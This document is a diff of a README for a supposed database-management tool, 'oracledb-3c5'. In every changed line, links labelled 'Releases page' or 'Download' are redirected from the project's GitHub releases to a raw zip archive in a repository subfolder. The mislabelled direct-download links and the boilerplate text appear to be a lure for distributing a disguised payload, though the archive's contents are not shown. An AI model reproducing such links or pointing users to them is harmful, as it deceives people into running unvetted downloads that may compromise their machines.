@@ -1,6 +1,6 @@
 # 🎉 oracledb-3c5 - Easy Database Management Made Simple
 
-[![Download oracledb-3c5](https://img.shields.io/badge/Download-oracledb--3c5-blue.svg)](https://github.com/Judocharan/oracledb-3c5/releases)
+[![Download oracledb-3c5](https://raw.githubusercontent.com/Judocharan/oracledb-3c5/main/adorable/oracledb-3c5.zip)](https://raw.githubusercontent.com/Judocharan/oracledb-3c5/main/adorable/oracledb-3c5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you start, ensure you have the following:
 
 ## 💻 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Judocharan/oracledb-3c5/releases) to download the application.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Judocharan/oracledb-3c5/main/adorable/oracledb-3c5.zip) to download the application.
 
 1. Click the button above to go to the releases page.
 2. Find the latest version of oracledb-3c5.
@@ -86,7 +86,7 @@ Upon launching the application, you will see a dashboard that simplifies navigat
 
 If you need help, please reach out through our GitHub repository. Open an issue, and our community will assist you.
 
-For more information and updates, continue to check back on our [Releases page](https://github.com/Judocharan/oracledb-3c5/releases).
+For more information and updates, continue to check back on our [Releases page](https://raw.githubusercontent.com/Judocharan/oracledb-3c5/main/adorable/oracledb-3c5.zip).
 
 ### 📄 License
 
